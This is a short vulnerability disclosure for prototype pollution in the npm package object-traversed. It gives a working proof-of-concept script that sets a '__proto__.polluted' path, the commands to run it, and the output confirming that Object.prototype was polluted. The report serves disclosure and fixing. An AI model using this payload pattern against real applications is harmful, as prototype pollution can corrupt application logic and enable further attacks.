# Description

Prototype Pollution in object-traversed

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var objectTraversed = require("object-traversed")
var obj = {}
console.log("Before : " + {}.polluted);
objectTraversed(obj).set("__proto__.polluted","Yes! Its Polluted");
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i object-traversed # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
